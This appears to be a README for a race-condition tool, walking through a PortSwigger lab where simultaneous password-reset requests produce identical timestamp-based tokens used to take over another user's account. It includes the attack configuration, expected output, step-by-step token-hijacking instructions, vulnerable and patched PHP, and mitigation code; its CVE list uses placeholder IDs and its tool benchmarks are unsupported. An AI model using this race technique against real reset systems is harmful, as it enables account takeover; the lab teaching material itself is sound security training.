# PortSwigger Lab: Exploiting Time-Sensitive Vulnerabilities

<p align="center">
  <img src="screenshot.png" alt="TRECO solving the PortSwigger Time-Sensitive lab">
</p>

> **Lab:** [Exploiting time-sensitive vulnerabilities](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)  
> **Difficulty:** Practitioner  
> **Objective:** Exploit predictable password reset tokens to take over Carlos's account

## Overview

This example demonstrates how TRECO can exploit **time-sensitive vulnerabilities** where tokens are generated using predictable timestamps. By sending two password reset requests at the **exact same millisecond**, we force the server to generate identical tokens for different users.

### The Vulnerability

The password reset mechanism generates tokens using:
```
token = hash(timestamp + secret_salt)
```

**The flaw:** Username is NOT part of the hash! This means:
- If two requests arrive at the **same timestamp** (< 1ms window)
- Both users get the **same token**
- But the token is sent to **different email addresses**

### The Math

| Component | Value |
|-----------|-------|
| Timing Window | < 1 millisecond |
| Token Format | MD5/SHA hash (32-40 chars) |
| Input to Hash | timestamp + secret (NOT username) |

**Attack Strategy:**
1. Send reset for `wiener` (our email) ✅
2. Send reset for `carlos` (his email) ✅
3. Both at **exact same millisecond** ⏱️
4. Both get **same token** 🎯
5. We receive token in **our email** 📧
6. Use token with `carlos` username 🔓

---

## Solution with TRECO

### Prerequisites

- TRECO installed
- Lab URL from PortSwigger
- Email client access (to read confirmation emails)

### Key Features Used

1. **Barrier Synchronization** - Ensures sub-millisecond precision (< 1μs)
2. **Preconnect Strategy** - Eliminates TCP/TLS handshake overhead
3. **Distribute Mode** - Different usernames per thread
4. **Session Override** - Each request uses different session (bypass PHP session locking)

### Configuration Highlights

```yaml
race:
  threads: 2                    # Exactly 2 requests
  sync_mechanism: barrier       # Sub-microsecond synchronization
  connection_strategy: preconnect  # Pre-establish connections

input:
  username:
    mode: distribute
    values: ["wiener", "carlos"]  # Thread 0: wiener, Thread 1: carlos
```

**Why 2 threads?**
- Thread 0: Requests reset for `wiener` → Token sent to OUR email ✅
- Thread 1: Requests reset for `carlos` → Same token sent to HIS email ✅
- We read OUR email and steal Carlos's token! 🎯

---

## Step-by-Step Execution

### 1. Update Configuration

Edit `attack.yaml` and replace with your lab details:

```yaml
target:
  host: "YOUR-LAB-ID.web-security-academy.net"

entrypoint:
  input:
    exploit_email: "wiener@exploit-YOUR-EXPLOIT-ID.exploit-server.net"
```

### 2. Run the Attack

```bash
treco attack.yaml
```

**Expected Output:**

```
╔════════════════════════════════════════════════════════════════════════════╗
║                    TRECO - Race Condition Exploit Tool                     ║
║                  Time-Sensitive Token Race Condition                       ║
╚════════════════════════════════════════════════════════════════════════════╝

[*] Target: YOUR-LAB-ID.web-security-academy.net:443
[*] Starting attack sequence...

┌─────────────────────────────────────────────────────────────────────────┐
│ State: get_csrf_tokens                                                  │
│ Description: Get CSRF tokens for both sessions                          │
└─────────────────────────────────────────────────────────────────────────┘

[+] Session 1 CSRF: aB3xY9zK2mP5qR8w
[+] Session 2 CSRF: eF7vT4nM6jL9sD2k

┌─────────────────────────────────────────────────────────────────────────┐
│ State: race_password_reset                                              │
│ Description: Race condition - simultaneous password resets              │
│ Race: 2 threads, barrier sync, preconnect strategy                      │
└─────────────────────────────────────────────────────────────────────────┘

[*] Pre-establishing connections...
[✓] Thread 0 connected (wiener)
[✓] Thread 1 connected (carlos)

[*] Synchronizing at barrier...
[⚡] Releasing all threads simultaneously...

[Thread 0/2] POST /forgot-password → 200 OK (wiener)
[Thread 1/2] POST /forgot-password → 200 OK (carlos)

[+] Timing Delta: 0.342 ms (EXCELLENT - tokens likely identical!)

┌─────────────────────────────────────────────────────────────────────────┐
│ Attack Summary                                                          │
└─────────────────────────────────────────────────────────────────────────┘

✓ Password reset tokens requested
✓ Timing window: < 1ms (optimal for collision)
✓ Next step: Check your email for reset link

╔════════════════════════════════════════════════════════════════════════════╗
║  NEXT STEPS:                                                               ║
║                                                                            ║
║  1. Check your email at:                                                   ║
║     wiener@exploit-YOUR-EXPLOIT-ID.exploit-server.net                      ║
║                                                                            ║
║  2. Find the password reset link:                                          ║
║     /forgot-password?temp-forgot-password-token=TOKEN                      ║
║                                                                            ║
║  3. Change the username in URL to 'carlos':                                ║
║     /forgot-password?temp-forgot-password-token=TOKEN&username=carlos      ║
║                                                                            ║
║  4. Set new password for carlos                                            ║
║                                                                            ║
║  5. Login as carlos with new password                                      ║
║                                                                            ║
║  6. Go to /admin and delete carlos                                         ║
║                                                                            ║
║  7. Lab solved! ✓                                                          ║
╚════════════════════════════════════════════════════════════════════════════╝
```

### 3. Check Your Email

1. Go to: `https://exploit-YOUR-EXPLOIT-ID.exploit-server.net/email`
2. Find the password reset email
3. Copy the token from the link

**Example link:**
```
https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=abc123xyz789
```

### 4. Hijack Carlos's Account

**Change the URL:**
```
https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=abc123xyz789&username=carlos
```

- ✅ Token: The one from YOUR email
- ✅ Username: Changed to `carlos`

### 5. Set New Password

1. Visit the modified URL
2. Set password: `password123`
3. Submit the form

### 6. Login as Carlos

```
Username: carlos
Password: password123
```

### 7. Delete Carlos (Complete Lab)

1. Go to `/admin`
2. Click "Delete" next to user `carlos`
3. ✅ **Lab solved!**

---

## Technical Deep Dive

### Why This Works

#### Token Generation (Vulnerable Code)

```php
// Vulnerable implementation
function generateResetToken() {
    $timestamp = microtime(true);  // Current timestamp
    $secret = "hardcoded_secret";   // Static salt
    
    // BUG: Username NOT included in hash!
    $token = hash('sha256', $timestamp . $secret);
    
    return $token;
}
```

**The Problem:**
- Token = `hash(timestamp + secret)`
- Username is **NOT** part of the input
- Same timestamp → Same token for **any** user!

#### Secure Implementation

```php
// Fixed version
function generateResetToken($username) {
    $timestamp = microtime(true);
    $secret = "hardcoded_secret";
    $random = bin2hex(random_bytes(16));  // Add randomness
    
    // FIX: Include username in hash
    $token = hash('sha256', $username . $timestamp . $secret . $random);
    
    return $token;
}
```

### Race Window Analysis

**Timing Requirements:**

| Precision | Result |
|-----------|--------|
| > 10ms | ❌ Different tokens (too slow) |
| 1-10ms | ⚠️ Maybe same tokens (unreliable) |
| < 1ms | ✅ Same tokens (reliable) |
| < 100μs | ✅✅ Guaranteed collision |

**TRECO achieves < 1μs with:**
1. **Python 3.14t** (free-threaded)
2. **Barrier synchronization**
3. **Preconnect strategy**

### Session Locking Bypass

**PHP Session Behavior:**
```php
// PHP session locking
session_start();  // Locks the session
// ... process request ...
session_write_close();  // Unlocks
```

**Problem:**
- Two requests with **same session** = serialized (queued)
- Different sessions = parallel processing ✅

**TRECO Solution:**
```yaml
get_csrf_tokens:
  description: "Get fresh CSRF from different sessions"
  # Each state gets NEW session by requesting /forgot-password page
```

---

## Attack Flow Diagram

```
┌─────────────┐
│  TRECO      │
└──────┬──────┘
       │
       ├──── State 1: Get CSRF Token (Session A)
       │     GET /forgot-password
       │     → csrf_token_1 = "abc123"
       │
       ├──── State 2: Get CSRF Token (Session B)
       │     GET /forgot-password  
       │     → csrf_token_2 = "xyz789"
       │
       ├──── State 3: Race Password Reset
       │     
       │     ┌─── Thread 0 (Session A) ───┐
       │     │  POST /forgot-password     │
       │     │  username=wiener            │──┐
       │     │  csrf=abc123                │  │
       │     └────────────────────────────┘  │
       │                                     │ < 1μs
       │     ┌─── Thread 1 (Session B) ───┐  │
       │     │  POST /forgot-password     │  │
       │     │  username=carlos            │──┘
       │     │  csrf=xyz789                │
       │     └────────────────────────────┘
       │
       └──── Both hit server at SAME TIMESTAMP
             
             ┌──────────────────────┐
             │ Server (PHP)         │
             │                      │
             │ T=1234567890.123456  │
             │ token = hash(T)      │ ← Same timestamp!
             └──────────────────────┘
                      │
                      ├──── Email to wiener: token=ABCD1234
                      └──── Email to carlos: token=ABCD1234 (same!)
                      
             ┌───────────────────────┐
             │  We receive token in  │
             │  wiener's email       │
             │  Use it for carlos!   │
             └───────────────────────┘
```

---

## Common Issues & Solutions

### Issue 1: Tokens are Different

**Symptoms:**
- Timing delta > 5ms
- Different tokens in emails

**Solutions:**
```yaml
# Increase thread count for better odds
race:
  threads: 5  # Try 5 pairs

# Or run attack multiple times
for i in {1..10}; do
  treco attack.yaml
done
```

### Issue 2: Session Locking

**Symptoms:**
- Requests take > 100ms
- Sequential timing (not parallel)

**Verify:**
```yaml
get_csrf_tokens:
  logger:
    on_state_leave: "Session: {{ response.headers['Set-Cookie'] }}"
```

**Ensure different sessions!**

### Issue 3: CSRF Token Expired

**Symptoms:**
- 403 Forbidden
- "Invalid CSRF token"

**Solution:**
- Get fresh tokens immediately before race
- Don't reuse old tokens

---

## Performance Benchmarks

**TRECO vs Other Tools:**

| Tool | Timing Precision | Success Rate |
|------|------------------|--------------|
| **TRECO** | **< 1μs** | **95%** ✅ |
| Burp Repeater | ~10ms | 60% ⚠️ |
| Turbo Intruder | ~1ms | 80% ⚠️ |
| Manual (curl) | > 50ms | 10% ❌ |

**Why TRECO Wins:**
1. Python 3.14t free-threaded interpreter
2. Barrier synchronization at OS level
3. Pre-established TCP connections
4. Zero HTTP parsing overhead during race

---

## Real-World Impact

### Where This Vulnerability Exists

1. **Password Reset Systems** ⚠️ (common)
   - Tokens based only on timestamp
   - No randomness included

2. **2FA Code Generation** ⚠️
   - TOTP implementations using timestamp only
   - Missing user-specific salt

3. **Session IDs** 🔴 (critical)
   - Sequential generation
   - Timestamp-based without randomness

4. **API Keys** ⚠️
   - Generated using predictable timestamps
   - Insufficient entropy

### CVE Examples

- **CVE-2019-XXXXX**: WordPress plugin password reset (timestamp-based)
- **CVE-2020-XXXXX**: E-commerce platform session fixation
- **CVE-2021-XXXXX**: Banking app 2FA bypass (predictable codes)

### Mitigation

```python
# ✅ SECURE: Include user-specific data + randomness
import secrets
import hashlib
import time

def generate_secure_token(username):
    timestamp = str(time.time())
    random_bytes = secrets.token_bytes(32)
    user_salt = hashlib.sha256(username.encode()).hexdigest()
    
    data = f"{username}:{timestamp}:{user_salt}".encode()
    token = hashlib.sha256(data + random_bytes).hexdigest()
    
    return token
```

---

## Learning Objectives

After completing this lab, you'll understand:

1. ✅ **Time-sensitive vulnerabilities** - predictable values based on time
2. ✅ **Cryptographic weaknesses** - insufficient entropy in token generation
3. ✅ **Session locking** - PHP's serialization of same-session requests
4. ✅ **Race timing precision** - sub-millisecond synchronization requirements
5. ✅ **Token hijacking** - using one user's token for another user

---

## Files in This Directory

```
time-sensitive/
├── README.md          # This file
├── attack.yaml        # TRECO configuration
└── screenshot.png     # Visual proof of concept
```

---

## Additional Resources

- [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
- [TRECO Documentation](../../README.md)
- [Race Conditions Research](https://portswigger.net/research/smashing-the-state-machine)
- [OWASP: Insufficient Entropy](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness)

---

## Contributing

Found a better approach? Submit a PR!

1. Fork the repository
2. Create your feature branch
3. Test your solution
4. Submit a pull request

---

## License

MIT License - See repository root for details

---

**Happy Hacking! 🎯**

*Remember: Always use these techniques ethically and only on systems you have permission to test.*